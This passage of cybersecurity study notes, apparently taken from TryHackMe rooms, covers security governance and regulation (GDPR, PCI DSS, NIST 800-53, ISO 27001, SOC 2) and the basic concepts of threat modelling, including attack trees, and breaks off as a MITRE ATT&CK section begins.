password is more acceptable than asking them to remember ten different
strong passwords.
- Easier MFA: Adding MFA to every different service is a humongous
task to accomplish and maintain. With SSO, MFA needs to be enabled and
configured once.
- Simpler Support: Support requests like password reset become more straightforward as they are now confined to a single account.
- Efficiency: A user does not need to log in every time they need to access a new service.

**GOVERNANCE AND REGULATION**

**Introduction**

Cyber security is a 
rapidly evolving landscape wherein malicious actors relentlessly 
endeavour to exploit vulnerabilities in highly-sensitive systems, often 
with the intent of causing severe damage, disruption, and stealing of 
sensitive corporate data. To combat this evolving threat, a 
comprehensive approach to **information security governance & regulation** is
 necessary. Such an approach requires establishing robust policies and 
guidelines and implementing rigorous monitoring and enforcement 
mechanisms to ensure compliance. By adopting a proactive and strategic 
stance towards cyber security, organisations can mitigate the risks 
posed by malicious actors and safeguard their sensitive systems against 
potentially catastrophic breaches.

**Why is it important?**

# Important Terminologies

- **Governance**: Managing and directing an organisation or system to achieve its
objectives and ensure compliance with laws, regulations, and standards.
- **Regulation**: A rule or law enforced by a governing body to ensure compliance and protect against harm.
- **Compliance**: The state of adhering to laws, regulations, and standards that apply to an organisation or system.

# Information Security Governance

Information
 security governance represents an organisation's established structure,
 policies, methods, and guidelines designed to guarantee the privacy, 
reliability, and accessibility of its information assets. Given the 
escalating complexity of cyber threats, the significance of information 
security governance is continually growing. It is essential for risk 
management, safeguarding confidential data from unauthorised intrusion, 
and adhering to pertinent regulations. Information security governance 
falls under the purview of top-tier management and includes the 
following processes:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/48120d5b5fc7d9cb7e283b8956e6a666.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/48120d5b5fc7d9cb7e283b8956e6a666.png)

- **Strategy**: Developing and implementing a comprehensive information security
strategy that aligns with the organisation's overall business
objectives.
- **Policies and procedures**: Preparing policies and procedures that govern the use and protection of information assets.
- **Risk management**: Conduct risk assessments to identify potential threats to the
organisation's information assets and implement risk mitigation
measures.
- **Performance measurement**: Establishing metrics
and key performance indicators (KPIs) to measure the effectiveness of
the information security governance program.
- **Compliance**: Ensuring compliance with relevant regulations and industry best practices.

# Information Security Regulation

Governance
 and regulation are closely linked in the information security paradigm 
but have distinct meanings. Information security regulation refers to 
legal and regulatory frameworks that govern the use and protection of 
information assets. Regulations are designed to protect sensitive
 data from unauthorized access, theft, and misuse. Compliance with 
regulations is typically mandatory and enforced by government agencies 
or other regulatory bodies. Examples of information security 
regulations/standards include the General Data Protection Regulation 
(GDPR), Payment Card Industry Data Security Standard (PCI DSS), Personal Information Protection and Electronic Documents Act (PIPEDA), and many more.

# Key Benefits

The following are the benefits of implementing governance and regulation:

- **More Robust Security Posture**: Implementing a comprehensive security governance program and complying
with relevant regulations can help an organisation reduce the risk of
security breaches and protect sensitive information from unauthorised
access, theft, and misuse.
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/a148517c47f4063df1a246f3ad278fd6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/a148517c47f4063df1a246f3ad278fd6.png)
    
- **Increased Stakeholder Confidence**: Effective security governance and regulation can enhance stakeholder
trust by demonstrating that an organisation takes cyber security
seriously and has implemented measures to protect sensitive data.
- **Regulatory Compliance**: Compliance with relevant regulations, such as GDPR, HIPAA, and PCI DSS, can help organisations avoid legal and financial penalties and reputational damage resulting from non-compliance.
- **Better alignment with business objectives**: Security governance frameworks can help organisations align their
information security strategies with their overall business objectives
and ensure that security measures are cost-effective and contribute to
the organisation's success.
- **Informed decision-making**:
Security governance programs can provide decision-makers with the
knowledge they need to make sophisticated decisions about information
security risks and ensure that security measures are implemented where
they are most needed.
- **Competitive advantage**: Effective
security governance and compliance with relevant regulations can provide a competitive advantage by demonstrating an organisation's commitment
to protecting sensitive data and enhancing stakeholder trust.

# Relevant Laws and Regulations

Specific
 laws and regulations operate the security governance and regulatory 
ecosystem. They provide a structured framework for establishing minimum 
compliance standards, promoting accountability and trust, and fostering 
innovative approaches to safeguarding critical systems and data. By 
offering clear and concise rules, they reduce ambiguity and provide a 
common language for organisations to measure their security posture and 
ensure regulatory compliance. Following is an overview of some relevant 
laws and regulations:

| **Law/Regulation** | **Domain** | **Description** |
| --- | --- | --- |
| General Data Protection Regulation (GDPR) | Data Privacy & Protection | GDPR
 is a regulation propagated by the European Union that sets strict 
requirements for how organisations handle and protect and  secure the 
personal data of EU citizens and residents. |
| Health Insurance Portability and Accountability Act (HIPAA) | Healthcare | A US-based official law to maintain the sensitivity of health-related information of citizens. |
| Payment Card Industry Data Security Standard (PCI-DSS) | Financial | Set
 technical and operational requirements to ensure the secure handling, 
storage, processing, and transmission of cardholder data by merchants, 
service providers, and other entities that handle payment cards. |
| Gramm-Leach-Bliley Act (GLBA) | Financial | Financial
 companies must be sensitive to their customers' nonpublic personal 
information (NPI), including implementing information security programs,
 providing privacy notices, and disclosing information-sharing 
practices. |

****﻿
**Information Security Frameworks**

The
 information security framework provides a comprehensive set of 
documents that outline the organisation's approach to information 
security and governs how security is implemented, managed, and enforced 
within the organisation. This mainly includes:

- Policies: A formal statement that outlines an organisation's goals, principles, and guidelines for achieving specific objectives.
- Standards: A document establishing specific requirements or specifications for a particular process, product, or service.
- Guidelines: A document that provides recommendations and best practices (non-mandatory) for achieving specific goals or objectives.
- Procedures: Set of specific steps for undertaking a particular task or process.
- Baselines: A set of minimum security standards or requirements that an organisation or system must meet.

# Developing Governance Documents

Here are some generalised steps used to develop policies, standards, guidelines, etc.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/957df3acd08e9884b95a28e72bd7219a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/957df3acd08e9884b95a28e72bd7219a.png)

- **Identify the scope and purpose**: Determine what the document will cover and why it is needed. For
example, a password policy might be required to ensure robust and secure user passwords. In contrast, a baseline might be required to establish a minimum level of security for all systems.
- **Research and review**: Research relevant laws, regulations, industry standards, and best
practices to ensure your document is comprehensive and up-to-date.
Review existing policies, procedures, and other documents to avoid
duplicating efforts or contradicting existing guidance.
- **Draft the document**: Develop an outline and start drafting the document, following best
practices for writing clear and concise policies, procedures, standards, guidelines, and baselines. Ensure the document is specific, actionable, and aligned with the organisation's goals and values.
- **Review and approval**: Have the document reviewed by stakeholders, such as subject matter
experts, legal and compliance teams, and senior management. Incorporate
their feedback and ensure the document aligns with organisational goals
and values. Obtain final approval from appropriate stakeholders.
- **Implementation and communication**: Communicate the document to all relevant employees and stakeholders,
and ensure they understand their roles and responsibilities in
implementing it. Develop training and awareness programs to ensure the
document is understood and followed.
- **Review and update**:
Periodically review and update the document to ensure it remains
relevant and practical. Monitor compliance and adjust the document based on feedback and changes in the threat landscape or regulatory
environment.

# Explanation through Real-world Scenarios

We will go through some real-world scenarios to fully understand the steps to develop these documents.

# Preparing a Password Policy

- **Define password requirements**: Minimum length, complexity, and expiration.
- **Define password usage guidelines**: Specify how passwords should be used, such as requiring unique
passwords for each account, prohibiting the sharing of passwords, and
prohibiting default passwords.
- **Define password storage and transmission guidelines**: Using encryption for password storage and requiring secure connections for password transmission.
- **Define password change and reset guidelines**: How often passwords should be changed etc.
- **Communicate the policy**: Communicate the password policy to all relevant employees and
stakeholders, and ensure that they understand the requirements and
guidelines. Develop training and awareness programs to ensure that
employees follow the policy.
- **Monitor compliance**: Monitor
compliance with the password policy and adjust the policy as needed
based on feedback and changes in the threat landscape or regulatory
environment.

# Making an Incident Response Procedure

- **Define incident types**: Unauthorised access, malware infections, or data breaches.
- **Define incident response roles and responsibilities**: Identify the stakeholders, such as incident response team members, IT
personnel, legal and compliance teams, and senior management.
- **Detailed Steps**: Develop step-by-step procedures for responding to each type of incident,
including initial response steps, such as containing the incident and
preserving evidence; analysis and investigation steps, such as
identifying the root cause and assessing the impact; response and
recovery steps, such as mitigating the incident, reporting and restoring normal operations.
- **Report** the incident to management and document the incident response process for future reference.
- **Communicate** the incident response procedures.
- **Review** and update the incident response procedures.

Organisations
 only sometimes need to make a standard, frameworks, or baselines; 
instead, they follow and use already made documents related to their 
field or discipline, as the financial sector may follow PCI-DSS and 
GLBA; healthcare may follow HIPPA, etc. There are numerous factors upon 
which we decide which standard framework of baseline checklist should be
 used; these include regulatory requirements primarily related to the 
particular geographical areas, scope, objectives, available resources, 
and many more.

**Governance Risk and Compliance (GRC)**

As we have studied, 
information security governance and compliance are necessary to maintain
 any organisation's overall security posture. But how to achieve it? 
Here comes the role of the Governance and Risk Compliance (GRC) 
framework. It focuses on steering the organisation's overall governance,
 enterprise risk management, and compliance in an integrated manner. It 
is a holistic approach to information security that aligns with the 
organisation's goals and objectives and helps to ensure that the 
organisation operates within the boundaries of relevant regulations and 
industry standards. GRC framework has the following three components:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/99f1191333d407baaa8e786ebd0ce9c0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/99f1191333d407baaa8e786ebd0ce9c0.png)

- **Governance Component**: Involves guiding an organisation by setting its direction through
information security strategy, which includes policies, standards,
baselines, frameworks, etc., along with establishing appropriate
monitoring methods to measure its performance and assess the outcomes.
- **Risk Management Component**: Involves identifying, assessing, and prioritising risks to the organisation and
implementing controls and mitigation strategies to manage those risks
effectively. This includes monitoring and reporting on risks and
continuously evaluating and refining the risk management program to
ensure its ongoing effectiveness.
- **Compliance Component**:
Ensuring that the organisation meets its legal, regulatory, and industry obligations and that its activities align with its policies and
procedures. This includes developing and implementing compliance
programs, conducting regular audits and assessments, and reporting on
compliance issues to stakeholders.

# How to Develop GRC Program - Generic Guidelines

A
 well-developed and implemented GRC program for cyber security provides 
an integrated framework for managing risks, complying with regulations 
and standards, and improving the overall security perspective of an 
organisation. It enables effective governance, risk management, and 
compliance activities, mitigating cyber incidents' impact and ensuring 
business resilience. In this section, we will explore how to develop and
 implement a GRC framework. Developing and implementing a GRC framework 
involves various steps; we will explain each step with an appropriate 
example so that we can easily understand:

- **Define the scope and objectives**: This step involves determining the scope of the GRC program and
defining its goals. For example, a company can implement a GRC program
for its customer data management system. The objective might be to
reduce cyber risks to 50% in the next 12 months while maintaining the
trust of its customers.
- **Conduct a risk assessment**: In
this step, the organisation identifies and assesses its cyber risks. For example, a risk assessment might reveal that the customer data
management system is vulnerable to external attacks due to weak access
controls or outdated software. The organisation can then prioritize
these risks and develop a risk management strategy.
- **Develop policies and procedures**: Policies and procedures are developed to guide cyber security practices within the organisation. For example, the company might establish a
password policy to ensure the usage of strong passwords. They might also implement logging and monitoring system access procedures to detect
suspicious activity.
- **Establish governance processes**:
Governance processes ensure the GRC program is effectively managed and
controlled. For example, the organisation might establish a security
steering committee that meets regularly to review security risks and
make decisions about security investments and priorities. Roles and
responsibilities are defined to ensure everyone understands their role
in the program.
- **Implement controls**: Technical and
non-technical controls are implemented to mitigate risks identified in
risk assessment. For example, the company might implement firewalls, [Intrusion Prevention System (IPS)](https://tryhackme.com/room/idsevasion), [Intrusion Detection System (IDS)](https://tryhackme.com/room/redteamnetsec), and [Security Information and Event Management (SIEM)](https://tryhackme.com/room/introtosiem) to prevent external attacks and impart employee training to improve security awareness and reduce the risk of human error.
- **Monitor and measure performance**: Processes are established to monitor and measure the effectiveness of
the GRC program. For example, the organisation can track metrics and
compliance with security policies. This information is used to identify
areas for improvement and adjust the program as needed.
- **Continuously improve**: The GRC program is constantly reviewed and improved based on
performance metrics, changing risk profiles, and stakeholder feedback.
For example, suppose the organisation experiences a security incident.
In that case, it might conduct a post-incident analysis to identify the
root cause and make changes to prevent a similar incident from happening again.

# An Example - GRC Framework in Financial Sector

To
 fully understand each component of GRC, it is necessary to understand 
it with real-world examples and scenarios. In the ensuing section, we 
will see how the financial industry implements each component of the GRC
 framework:

- **Governance-Related Activities:** Nominate
the governance level executives, and make financial-related policies
such as bank secrecy act, anti-money laundering policy, financial audit
policies, financial reporting, crisis management, and many more.
- **Risk Management Activities:** Identify potential risks, their possible outcomes, and countermeasures
such as financial fraud risks, fraudulent transactions through
cyber-attack, stolen credentials through phishing, fake ATM cards, etc.
- **Compliance Activities:** Take measures to meet legal requirements and industry standards such as PCI DSS, GLBA, etc. Moreover, this also includes implementing correct methods
like SSL/ TLS to avoid Man in the Middle (MITM) attacks, ensuring
automatic patch management against unpatched software, creating
awareness campaigns for users to protect them from phishing attacks, and many more.

**Privacy and Data Protection**

In every sector, 
such as financial, healthcare, government, and industry, privacy and 
data protection regulations are critical as they deal with citizens' 
Personally Identifiable Information (PII).
 Privacy regulations help ensure individuals' personal information is 
handled and stored responsibly and ethically. They also help to 
establish trust, protect personal information, and maintain regulatory 
compliance. Moving forward, we will go through essential cardinals of 
the most important privacy and data protection regulations and their 
purpose, which will help us to understand why data protection 
regulations are crucial.

# General Data Protection Regulation (GDPR)

The [GDPR](https://gdpr-info.eu/) is a data protection law implemented by the EU in May 2018 to protect personal data. Personal data is "*Any data associated with an individual that can be utilised to identify them either directly or indirectly*". Key points of the law include the following:

- **Prior approval** must be obtained before collecting any personal data.
- Personal data should be kept to a **minimum** and only collected when necessary.
- **Adequate measures** are to be adopted to protect stored personal data.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/772ddef796e37d2c2f82c1bb9b240a36.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/772ddef796e37d2c2f82c1bb9b240a36.png)

The
 law applies to all business entities that conduct business in the 
European Union (EU) and collect/store/process the personal data of EU 
residents and are required to comply. It is one of the most stringent 
data privacy regulations worldwide and safeguards personal data during 
collection. Companies can only collect personal data for a legitimate 
reason and must inform the owner about its processing. Moreover, this 
also includes penalties and fines based on non-compliance in the 
following two tiers:

- Tier 1: More severe violations, including unintended data collection, sharing
data with third parties without consent, etc. Maximum penalty amounting
to 4% of the organisation's revenue or 20 million euros (whichever is
higher).
- **Tier 2**: Less severe violations, including data
breach notifications, cyber policies, etc. The maximum fine for Tier 2
is 2% of the organisation's revenue or 10 million euros (whichever is
higher).

# Payment Card Industry Data Security Standard (PCI DSS)

[PCI DSS](https://www.pcisecuritystandards.org/)
 is focused on maintaining secure card transactions and protecting 
against data theft and fraud. It is widely used by businesses, primarily
 online, for card-based transactions. It was established by major credit
 card brands (Visa, MasterCard & American Express). It requires 
strict control access to cardholder information and monitoring 
unauthorised access, using recommended measures such as web application 
firewalls and encryption. You can learn more about the standard [here](https://docs-prv.pcisecuritystandards.org/PCI%20DSS/Supporting%20Document/PCI_DSS-QRG-v4_0.pdf).

**NIST Special Publications**

**NIST 800-53**

[NIST 800-53](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf) is a publication titled "**Security and Privacy Controls for Information Systems and Organisations**",  developed by the National Institute of Standards and Technology (NIST), US, that provides a catalogue of security controls to protect the CIA triad of information systems. The
 publication serves as a framework for organisations to assess and 
enhance the security and privacy of their information systems and comply
 with various laws, regulations, and policies. It incorporates best 
practices from multiple sources, including industry standards, 
guidelines, and international frameworks.

# Key Points

NIST
 800-53 offers a comprehensive set of security and privacy controls that
 organisations can use to safeguard their operations, assets, personnel,
 and other organisations from various threats and risks. These include 
intentional attacks, unintentional errors, natural disasters, 
infrastructure failures, foreign intelligence activity, and privacy 
concerns. NIST 800-53 Revision 5 organises security controls into twenty
 families, each addressing a specific security concern category. You can
 learn more about the controls [here](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf) (Section 2.2).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/2d3a7efe843b31609b11e53cbc1e2719.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/2d3a7efe843b31609b11e53cbc1e2719.png)

# Developing and Implementing 800-53 based Information Security Program

Among all the families, "**Program Management**" is one of the crucial control of the NIST
 800-53 framework. Program Management control mandates establishing, 
implementing, and monitoring organisation-wide programs for information 
security and privacy while safeguarding the processed, stored, or 
transmitted through systems. To ensure program management, the following
 subcontrols are necessary to be implemented:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/43092cc2b85ee7ce4395ce6d7afd842f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/43092cc2b85ee7ce4395ce6d7afd842f.png)

# Compliance Best Practices

First and foremost, businesses must conduct a thorough

**discovery process**

to recognise and catalogue their data assets, information systems, and associated threats. This includes understanding

**data flows, system dependencies, and potential vulnerabilities**

.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8b7e0ab2ab4f7b72b59e6489cb893063.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8b7e0ab2ab4f7b72b59e6489cb893063.png)

The

NIST

800-53 control families must be mapped to the

**identified assets and hazards**

, making creating a structured approach for matching the controls to the organisation's demands easier. Thirdly,

**creating a governance structure**

, allocating duties, and outlining precise controls implementation and maintenance procedures are all necessary to effectively

**manage**

the implementation process. All measures must be

**regularly monitored**

and
 evaluated to ensure compliance. Finally, organisations should establish
 effective monitoring systems to identify and address security issues, 
conduct routine evaluations and audits, and improve control 
implementation. By adhering to these best practices, organisations can 
successfully implement

NIST

800-53 and enhance their security outlook while mitigating risks effectively.

# NIST

NIST Special Publication 800-63B is a set of guidelines created by the NIST to help organisations establish effective **digital identity practices**.
 Its primary focus is on authenticating and verifying the identities of 
individuals who access digital services, systems, and networks. The 
guidelines provide recommendations for different levels of identity 
assurance, ranging from basic to high assurance. They also offer advice 
on using authentication factors, including passwords, biometrics, and 
tokens, and securely managing and storing user credentials.

**Information Security Management and Compliance**

The strategic 
planning, execution, and continuous administration of security measures 
are all part of Information Security (IS) management, which **protects information assets from unauthorised access, use, disclosure, interruption, alteration, and destruction**.
 It involves risk assessment and identification, security controls and 
procedures development, incident response planning, and security 
awareness training. Contrarily, compliance refers to **observing information security-related legal, regulatory, contractual, and industry-specific standards**. In IS management and compliance, we will go through two key standards.

# ISO/IEC 27001

**ISO 27001** is an internationally recognised standard for requirements to **plan, develop, run, and update**
 an organisation's Information Security Management System (ISMS). The 
official ISO/IEC 27001 documents are paid for and can be purchased from 
this [link](https://www.iso.org/standard/27001).
 It was developed by International Organization for Standardization 
(ISO) and the International Electrotechnical Commission (IEC) and has 
the following core components:

- **Scope**: This specifies the ISMS's boundaries, including the covered assets and processes.
- **Information security policy**: A high-level document defining an organisation's information security approach.
- **Risk assessment**: Involves identifying and evaluating the risks to the confidentiality,
integrity, and availability of the organisation's information.
- **Risk treatment**: Involves selecting and implementing controls to reduce the identified risks to an acceptable level.
- **Statement of Applicability (SoA)**: This document specifies which controls from the standard are applicable and which are not.
- **Internal audit**: This involves conducting periodic audits of the ISMS to ensure that it is operating effectively.
- **Management review**: Review the performance of ISMS at regular intervals.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/2e0517ce65aa9336144e9832fb65cce1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/2e0517ce65aa9336144e9832fb65cce1.png)

An ISMS built on the ISO 27001 standard requires careful design and execution. It entails exhaustively evaluating the **organisation's security procedures, detecting gaps, and conducting a thorough risk assessment**.
 Access control, incident response, etc., are just a few examples of the
 areas where clear rules and processes must be created and aligned with 
ISO 27001 requirements. **Leadership support and resource allocation** are also essential for the ISMS to be implemented successfully. **Regular monitoring, measurement, and continual development** are crucial to guarantee the efficacy and continued alignment of the ISMS with the organization's objectives.

# Service Organisation Control 2 ( 2)

**SOC 2** was developed by the American Institute of Certified Public Accountants (AICPA) as a **compliance/auditing framework**. It focuses on assessing the efficacy of a company's data security based on the CIA triad. SOC 2 can reassure customers, stakeholders, and business partners that the company has put **sufficient controls in place to safeguard its systems, data, and sensitive information**.

The SOC 2 framework is essential for service providers interacting with client data or offering solutions that **process, store, or transmit sensitive data**.
 It assists businesses in demonstrating their dedication to upholding 
strict privacy and security standards. Customers frequently ask for SOC 2 reports or use them as a competitive advantage to guarantee clients that their information will be handled securely. You can learn more about it [here](https://soc2.co.uk/).

# Important Cardinals

- SOC 2 is an auditing standard that evaluates the usefulness of a service
organisation's controls related to confidentiality, availability,
integrity, and privacy.
- Independent auditors conduct SOC 2 audits to determine that security controls meet the relevant criteria.
- SOC 2 reports provide valuable information to customers, stakeholders, and
regulators on a service organisation's security and privacy practices.
They can be used to demonstrate that the service organisation has
adequate controls to protect the data and systems it uses to process
customers' information. For example, a cloud computing company that
provides infrastructure services to other businesses may undergo a SOC 2 audit to demonstrate its adequate controls to protect customer data
stored on its servers. The audit may cover physical security, network
security, data encryption, backup and recovery, and employee training
and awareness.
- The SOC 2 audit report will assess the controls in place at the cloud computing company and include any findings or recommendations for improvement.
The information can be shared with customers and other stakeholders to
ensure the company takes appropriate measures to protect its data and
systems.

# What Information Security Protection 2 provides?

The primary purpose of the SOC 2 audit is to ensure that third-party service providers store and process sensitive information securely.

**Planning and Undergoing a SOC 2 Audit**

The following steps can be taken by an organisation’s management team before and during an audit:

- **Determine the scope**: This may include specific systems, processes, or locations that are relevant to the security and privacy of customer data.
- **Choose a suitable auditor**: Select a qualified auditor with experience conducting SOC 2 audits for financial companies. Consider factors such as the auditor's reputation, experience, and availability.
- **Plan the audit:** Work with the auditor to plan the audit, including the audit timeline, the scope of the audit, and the audit criteria.
- **Prepare for the audit**: Prepare for the audit by reviewing your security and privacy controls,
policies, and procedures. Identify any gaps or deficiencies and develop a plan to address them.
- **Conduct the audit**: The auditor
will review your controls and conduct testing to assess their
effectiveness. The audit may include interviews with key personnel,
documentation reviews, and controls tests.
- **Receive the audit report**: Once the audit is complete, the auditor will provide a report detailing the audit results. The report may include a description of your
controls, any deficiencies or gaps identified, and recommendations for
improvement.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/b3ce9d297ce5934620c3686b114529d0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/b3ce9d297ce5934620c3686b114529d0.png)

The above diagram shows the generic controls that will be checked during a SOC
 2 audit for a financial company depending on the scope of the audit. 
Other than that, there are technical and specific controls, like 
ensuring data encryption in transit, network security, incident 
management, etc.

## **THREAT MODELLING**

**Introduction**

*Amid an 
ever-evolving threat landscape, is your organisation prepared to 
mitigate potential risks? Do you proactively identify vulnerabilities, 
prioritise threats, and implement security measures to safeguard your 
critical assets? How does your approach to managing security risks 
contribute to maintaining customer trust?*

These
 questions arise when you consider the importance of threat modelling in
 today's rapidly changing cyber security landscape. When 
confronted with a sophisticated threat actor, are you confident in your 
team's ability to neutralise it effectively, or will these actors 
succeed in achieving their goals?

**Threat Modelling Overview**

As we dive into this topic, let's briefly define threat modelling to ensure a comprehensive understanding.

# What is Threat Modelling?

Threat modelling is a systematic approach to **identifying, prioritising, and addressing potential security threats** across
 the organisation. By simulating possible attack scenarios and assessing
 the existing vulnerabilities of the organisation's interconnected 
systems and applications, threat modelling enables organisations to 
develop proactive security measures and make informed decisions about 
resource allocation.

Threat modelling aims to reduce an 
organisation's overall risk exposure by identifying vulnerabilities and 
potential attack vectors, allowing for adequate security controls and 
strategies. This process is essential for constructing a robust defence 
strategy against the ever-evolving cyber threat landscape.

# Threat, Vulnerability and Risk

As
 mentioned above, the main goal of threat modelling is to reduce the 
organisation's risk exposure. So before we deep dive into its 
application, let's review first the definitions of **Threat, Vulnerability and Risk**.

| **Type** | **Definition** |
| --- | --- |
| **Threat** | Refers
 to any potential occurrence, event, or actor that may exploit 
vulnerabilities to compromise information confidentiality, integrity, or
 availability. It may come in various forms, such as cyber attacks, 
human error, or natural disasters. |
| **Vulnerability** | A
 weakness or flaw in a system, application, or process that may be 
exploited by a threat to cause harm. It may arise from software bugs, 
misconfiguration, or design flaws. |
| **Risk** | The
 possibility of being compromised because of a threat taking advantage 
of a vulnerability. A way to think about how likely an attack might be 
successful and how much damage it could cause. |

To simplify it, we can use an analogy of an organisation as a house and describe the potential threat, vulnerability and risk.

| **Type** | **Analogy** |
| --- | --- |
| **Threat** | Occurrence of someone breaking inside your home and taking all your belongings. |
| **Vulnerability** | Weaknesses in your home security, such as broken locks or open windows. |
| **Risk** | Likelihood of being burglarised due to living in a neighbourhood with a high crime rate or a lack of an alarm system. |

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/cb02e9d8aff79e0196eb380c771147f9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/cb02e9d8aff79e0196eb380c771147f9.png)

Understanding
 the differences between threat, vulnerability, and risk is essential 
for effective threat modeling. It enables the organisation to 
effectively identify and prioritise security issues, resulting in a 
faster way of reducing risk exposure.

# High-Level Process of Threat Modelling

Before delving into different threat modelling frameworks, let's briefly run through a simplified, high-level process.

1. **Defining the scope**
    
    Identify the specific systems, applications, and networks in the threat modelling exercise.
    
2. **Asset Identification**
    
    Develop diagrams of the organisation's
     architecture and its dependencies. It is also essential to identify the
     importance of each asset based on the information it handles,  such as 
    customer data, intellectual property, and financial information.
    
3. **Identify Threats**
    
    Identify potential threats that may impact
     the identified assets, such as cyber attacks, physical attacks, social 
    engineering, and insider threats.
    
4. **Analyse Vulnerabilities and Prioritise Risks**
    
    Analyse the 
    vulnerabilities based on the potential impact of identified threats in 
    conjunction with assessing the existing security controls. Given the 
    list of vulnerabilities, risks should be prioritised based on their 
    likelihood and impact.
    
5. **Develop and Implement Countermeasures**
    
    Design and implement 
    security controls to address the identified risks, such as implementing 
    access controls, applying system updates, and performing regular 
    vulnerability assessments.
    
6. **Monitor and Evaluate**
    
    Continuously test and monitor the 
    effectiveness of the implemented countermeasures and evaluate the 
    success of the threat modelling exercise. An example of a simple 
    measurement of success is tracking the identified risks that have been 
    effectively mitigated or eliminated.
    

By following these steps, an organisation can conduct a comprehensive
 threat modelling exercise to identify and mitigate potential security 
risks and vulnerabilities in their systems and applications and develop a
 more effective security strategy.

Remember that the example 
above is a generic high-level process; threat modelling frameworks will 
be introduced in the following tasks.

# Collaboration with Different Teams

The
 high-level process discussed above involves many tasks, so it is 
crucial to have multiple teams collaborate. Each unit offers valuable 
skills and expertise, helping improve the organisation's security 
posture. By collaborating, organisations can effectively address and 
align the security efforts needed to build a better defence.

In line with this, we will introduce the teams typically involved in a threat modelling Exercise.

| **Team** | **Role and Purpose** |
| --- | --- |
| **Security Team** | The
 overarching team of red and blue teams. This team typically lead the 
threat modelling process, providing expertise on threats, 
vulnerabilities, and risk mitigation strategies. They also ensure 
security measures are implemented, validated, and continuously 
monitored. |
| **Development Team** | The 
development team is responsible for building secure systems and 
applications. Their involvement ensures that security is always 
incorporated throughout the development lifecycle. |
| **IT and Operations Team** | IT
 and Operations teams manage the organisation's infrastructure, 
including networks, servers, and other critical systems. Their knowledge
 of network infrastructure, system configurations and application 
integrations is essential for effective threat modelling. |
| **Governance, Risk and Compliance Team** | The
 GRC team is responsible for organisation-wide compliance assessments 
based on industry regulations and internal policies. They collaborate 
with the security team to align threat modelling with the organisation's
 risk management objectives. |
| **Business Stakeholders** | The
 business stakeholders provide valuable input on the organisation's 
critical assets, business processes, and risk tolerance. Their 
involvement ensures that the efforts align with the organisation's 
strategic goals. |
| **End Users** | As direct 
users of a system or application, end users can provide unique insights 
and perspectives that other teams may not have, enabling the 
identification of vulnerabilities and risks specific to user 
interactions and behaviours. |

Note
 that the list is not limited to these teams and may vary depending on 
your organisational structure. Moreover, the collaboration of these 
teams is not limited to threat modelling exercises, as they also work 
hand in hand in securing the organisation through different initiatives.

# Attack Trees

In
 addition to the high-level methodology discussed above, creating an 
attack tree is another good way to identify and map threats.

An
 ﻿attack tree is a graphical representation used in threat modelling to 
systematically describe and analyse potential threats against a system, 
application or infrastructure. It provides a structured, hierarchical 
approach to breaking down attack scenarios into smaller components. Each
 node in the tree represents a specific event or condition, with the 
root node representing the attacker's primary goal.

For a 
quick example, let's use the diagram below that represents a scenario of
 an attacker trying to gain unauthorised access to sensitive data stored
 in a cloud-based storage system.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ab10d8571dca42dfcab63c952c436413.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ab10d8571dca42dfcab63c952c436413.png)

In this diagram, the root node represents the attacker's primary goal: **gain unauthorised access to sensitive data**.
 The first level of child nodes represents different high-level 
strategies an attacker might do to achieve the goal. Each node further 
breaks down into specific steps, detailing the attacker's possible 
techniques and actions.

In addition to the traditional 
hierarchical structure, attack trees can be organised as attack paths, 
which depict the possible routes or sequences of vulnerabilities a 
threat actor can exploit to achieve their goal. Attack paths are 
essentially chains of vulnerabilities that are interconnected.

In
 an attack path representation, the initial starting node represents the
 attacker's entry point into the system or network. From there, the 
various branches or nodes represent the specific vulnerabilities, attack
 vectors, or steps the threat actor can follow to advance towards their 
objective.

**Modelling with MITRE ATT&CK**

After having a good overview of threat modelling concepts, let's start with the first framework of this room - the MITRE ATT&CK Framework.

# MITRE

For a quick refresher, let's define MITRE ATT&CK again.

